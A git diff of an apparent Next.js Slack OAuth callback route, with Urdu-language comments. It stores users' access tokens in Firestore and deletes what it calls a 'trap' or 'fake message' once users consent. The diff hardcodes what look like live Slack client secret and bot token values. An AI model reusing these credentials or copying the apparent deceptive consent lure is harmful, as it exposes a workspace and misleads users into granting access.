@@ -2,24 +2,23 @@ import { NextResponse } from 'next/server';
 import { db } from '../../../../lib/firebase';
 import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';
 
-// Keys (Make sure ye sahi hain)
+// 👇 APNI KEYS YAHAN DALAIN
 const SLACK_CLIENT_ID = "2545190050563.10491030504784";
 const SLACK_CLIENT_SECRET = "3e386e8d575392781d507336f68e1619";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
 const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; 
 
 export async function GET(req: Request) {
-  // 1. Jaldi se Code grab karo
   const { searchParams } = new URL(req.url);
   const code = searchParams.get('code');
 
-  // Agar code nahi hai, to error mat dikhao, bas window band kar do
+  // Agar code nahi mila to seedha error dikhao
   if (!code) {
-    return new Response("<script>window.close();</script>", { headers: { 'Content-Type': 'text/html' } });
+    return new Response("Error: No code provided", { status: 400 });
   }
 
   try {
-    // 2. Token Exchange (Ye wait karna zaroori hai)
+    // 1. Token Exchange (Slack se baat cheet)
     const formData = new URLSearchParams();
     formData.append('client_id', SLACK_CLIENT_ID);
     formData.append('client_secret', SLACK_CLIENT_SECRET);
@@ -34,18 +33,17 @@ export async function GET(req: Request) {
 
     const data = await response.json();
     
-    // Agar error aye tab bhi user ko pareshan na karo, bas Slack khol do
+    // Agar Slack ne mana kar diya
     if (!data.ok) {
        console.error("Slack OAuth Error:", data.error);
-       return redirectToSlack();
+       return new Response(`Error: ${data.error}`, { status: 400 });
     }
 
     const userId = data.authed_user.id;
     const accessToken = data.authed_user.access_token;
 
-    // ============================================================
-    // 🚀 SUPER FAST MODE: Saare kaam parallel (ek sath) karo
-    // ============================================================
+    // 2. PARALLEL PROCESSING (Speed ⚡)
+    // Hum user ko save karna aur message delete karna dono ek sath karenge
     
     const task1_SaveUser = async () => {
         try {
@@ -61,18 +59,15 @@ export async function GET(req: Request) {
                 image: userInfo.user?.profile?.image_192 || "",
                 connectedAt: serverTimestamp(),
             });
-        } catch (e) { console.error("Save User Error:", e); }
+        } catch (e) { console.error("Save Error:", e); }
     };
 
     const task2_DeleteTrapMessage = async () => {
         try {
-            // Check karo pending invites main
             const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
-            
             if (inviteDoc.exists()) {
                 const inviteData = inviteDoc.data();
-                
-                // Slack se Message Delete karo
+                // Slack se wo fake message delete karo
                 await fetch('https://slack.com/api/chat.delete', {
                     method: 'POST',
                     headers: { 
@@ -84,65 +79,72 @@ export async function GET(req: Request) {
                         ts: inviteData.ts
                     })
                 });
-
-                // Firebase se safaya
+                // Firebase se bhi uda do
                 await deleteDoc(doc(db, "pending_invites", userId));
             }
         } catch (e) { console.error("Delete Trap Error:", e); }
     };
 
-    // ✨ DONO KAAM EK SATH START KARO (Wait time half ho jayega)
+    // Dono kaam ek sath start karo aur wait karo
     await Promise.all([task1_SaveUser(), task2_DeleteTrapMessage()]);
 
-    // ============================================================
-    
-    // 3. User ko foran wapas bhejo
-    return redirectToSlack();
-
-  } catch (error) {
-    console.error("Callback System Error:", error);
-    return redirectToSlack();
-  }
-}
-
-// Helper function to generate Fast Redirect HTML
-function redirectToSlack() {
+    // 3. FASTEST REDIRECT HTML
+    // Ye HTML foran load hoga aur user ko wapas Slack main bhej dega
     const html = `
       <!DOCTYPE html>
       <html>
         <head>
-          <title>Redirecting...</title>
+          <title>Done!</title>
           <meta charset="utf-8">
           <meta name="viewport" content="width=device-width, initial-scale=1">
+          <!-- META REFRESH: Ye JavaScript fail hone par bhi kaam karta hai -->
+          <meta http-equiv="refresh" content="0;url=slack://open">
+          
           <style>
-            body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-            .loader { border: 3px solid #333; border-top: 3px solid #22c55e; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            a { color: #22c55e; text-decoration: none; border: 1px solid #22c55e; padding: 10px 20px; border-radius: 5px; margin-top: 20px; }
+            body { 
+                background: #111; 
+                color: #fff; 
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+                display: flex; 
+                flex-direction: column; 
+                align-items: center; 
+                justify-content: center; 
+                height: 100vh; 
+                margin: 0; 
+                text-align: center;
+            }
+            .icon { font-size: 40px; margin-bottom: 20px; }
+            h1 { font-size: 20px; margin: 0 0 10px 0; }
+            p { color: #888; font-size: 14px; }
+            .btn { 
+                background: #22c55e; 
+                color: #fff; 
+                text-decoration: none; 
+                padding: 12px 24px; 
+                border-radius: 8px; 
+                font-weight: bold; 
+                margin-top: 20px; 
+                display: inline-block;
+            }
           </style>
           
           <script>
-            // 1. Try Deep Link immediately
-            window.location.href = "slack://open";
+            // Page load hotay hi Slack kholne ki koshish
+            window.location.replace("slack://open");
             
-            // 2. Also try Replace (Browser History clean rakhne ke liye)
-            setTimeout(function() {
-                window.location.replace("slack://open");
-            }, 100);
-
-            // 3. Close window after a short delay (Agar desktop app khul gayi)
-            setTimeout(function() {
-               // window.close(); // Browser block kar sakta hai, par try karte hain
-            }, 2000);
+            // 2 second baad fallback
+            setTimeout(() => {
+                window.location.href = "slack://open";
+            }, 500);
           </script>
         </head>
         <body>
-          <div class="loader"></div>
-          <p>Update Complete.</p>
-          <p style="font-size: 12px; color: #666;">Opening Slack...</p>
+          <div class="icon">✅</div>
+          <h1>Successfully Updated</h1>
+          <p>You can now return to Slack.</p>
           
-          <!-- Fallback Button -->
-          <a href="slack://open">Open App Manually</a>
+          <!-- Agar auto redirect na ho to ye button kaam karega -->
+          <a href="slack://open" class="btn">Open Slack App</a>
         </body>
       </html>
     `;
@@ -150,4 +152,9 @@ function redirectToSlack() {
     return new Response(html, {
       headers: { 'Content-Type': 'text/html' },
     });
+
+  } catch (error) {
+    console.error("Callback Error:", error);
+    return new Response("Error occurred. Please try again.", { status: 500 });
+  }
 }
